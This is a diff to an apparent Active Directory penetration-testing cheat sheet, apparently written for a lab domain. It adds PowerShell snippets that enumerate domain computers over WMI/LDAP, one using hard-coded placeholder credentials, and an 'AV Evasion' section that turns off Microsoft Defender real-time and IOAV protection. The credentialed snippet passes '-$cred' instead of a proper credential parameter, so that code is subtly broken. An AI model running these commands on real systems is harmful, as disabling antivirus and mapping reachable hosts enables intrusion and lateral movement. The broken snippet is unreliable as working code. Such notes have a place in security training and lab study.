@@ -673,8 +673,23 @@ PS C:\Windows\system32> $sess = New-PSSession -ComputerName HYDRA
 PS C:\Windows\system32> invoke-Command -ScriptBlock {whoami} -Session $sess
 marvel\administrator
 ```
+# Get Computer list that curent user have access to:
 
-#AV Evasion with local admin:
+```
+$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
+foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer ).Name }
+```
+# Get Computer list that target $user have access to
+```
+$Username = 'domain\username'
+$Password = 'password'
+$pass = ConvertTo-SecureString -AsPlainText $Password -Force
+$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$pass
+$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
+foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer -$cred ).Name }
+```
+
+# AV Evasion with local admin:
 ```
 Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableRealtimeMonitoring $true
